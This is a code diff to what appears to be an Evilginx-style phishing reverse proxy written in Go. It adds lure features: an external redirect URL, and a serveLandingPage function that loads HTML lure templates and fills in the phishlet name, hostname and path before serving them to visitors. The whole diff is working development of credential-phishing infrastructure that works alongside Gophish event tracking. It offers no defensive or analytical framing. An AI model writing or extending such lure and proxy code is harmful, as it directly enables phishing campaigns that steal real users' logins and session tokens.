@@ -674,14 +674,20 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 									session.RemoteAddr = remote_addr
 									session.UserAgent = req.Header.Get("User-Agent")
-									session.RedirectURL = pl.RedirectUrl
-									if l.RedirectUrl != "" {
-										session.RedirectURL = l.RedirectUrl
+									// Check if external redirect is enabled for this lure
+									if l.UseExternalRedirect && l.ExternalRedirectUrl != "" {
+										session.RedirectURL = l.ExternalRedirectUrl
+										log.Debug("using external redirect URL (lure): %s", session.RedirectURL)
+									} else {
+										session.RedirectURL = pl.RedirectUrl
+										if l.RedirectUrl != "" {
+											session.RedirectURL = l.RedirectUrl
+										}
+										log.Debug("redirect URL (lure): %s", session.RedirectURL)
 									}
 									// redirect_url should point to the real site, not the phished domain
 									// do not rewrite it through replaceUrlWithPhished
 									session.PhishLure = l
-									log.Debug("redirect URL (lure): %s", session.RedirectURL)
 
 									ps.SessionId = session.Id
 									ps.Created = true
@@ -806,10 +812,28 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 									} else {
 										log.Error("lure: redirector file does not exist: %s", index_found)
+								}
+							}
+						}
+						
+						// Show landing page if configured for this lure
+						if l.LandingPage != "" {
+							log.Debug("lure landing page check: landing_page='%s' path='%s'", l.LandingPage, req_path)
+							if !p.isForwarderUrl(req.URL) {
+								landing_html := p.serveLandingPage(l, req.Host, req_path, pl_name, &s.Params)
+								if landing_html != "" {
+									landing_html = p.replaceHtmlParams(landing_html, lure_url, &s.Params)
+									log.Info("lure: serving landing page '%s' (html length: %d)", l.LandingPage, len(landing_html))
+									resp := goproxy.NewResponse(req, "text/html", http.StatusOK, landing_html)
+									if resp != nil {
+										return req, resp
+									} else {
+										log.Error("lure: failed to create landing page response")
 									}
 								}
 							}
-						} else if s.RedirectorName != "" {
+						}
+					} else if s.RedirectorName != "" {
 							// session has already triggered a lure redirector - see if there are any files requested by the redirector
 
 							rel_parts := []string{}
@@ -3069,4 +3093,53 @@ func recordGophishEvent(rid string, ip string, userAgent string, eventType strin
 	case "submit":
 		rs.HandleFormSubmit(d)
 	}
+}
+
+// serveLandingPage generates and serves the landing page HTML for a lure
+func (p *HttpProxy) serveLandingPage(l *Lure, host string, path string, phishletName string, params *map[string]string) string {
+	if l.LandingPage == "" {
+		return ""
+	}
+
+	landing_pages_dir := p.cfg.GetLandingPagesDir()
+	template_parts := strings.Split(l.LandingPage, "/")
+	if len(template_parts) != 2 {
+		log.Error("lure: invalid landing page format '%s' (expected 'category/template')", l.LandingPage)
+		return ""
+	}
+
+	category := template_parts[0]
+	template_id := template_parts[1]
+	t_dir := filepath.Join(landing_pages_dir, category, template_id)
+
+	index_path := filepath.Join(t_dir, "index.html")
+	if _, err := os.Stat(index_path); os.IsNotExist(err) {
+		log.Error("lure: landing page index.html not found: %s", index_path)
+		return ""
+	}
+
+	html, err := os.ReadFile(index_path)
+	if err != nil {
+		log.Error("lure: failed to read landing page file: %s", err)
+		return ""
+	}
+
+	body := string(html)
+
+	// Replace custom landing page parameters
+	if l.LandingConfig != nil {
+		for k, v := range l.LandingConfig {
+			key := "{param:" + k + "}"
+			body = strings.Replace(body, key, v, -1)
+		}
+	}
+
+	// Replace standard placeholders
+	body = strings.Replace(body, "{timestamp}", fmt.Sprintf("%d", time.Now().Unix()), -1)
+	body = strings.Replace(body, "{random_id}", GenRandomString(8), -1)
+	body = strings.Replace(body, "{phishlet}", phishletName, -1)
+	body = strings.Replace(body, "{hostname}", host, -1)
+	body = strings.Replace(body, "{path}", path, -1)
+
+	return body
 }
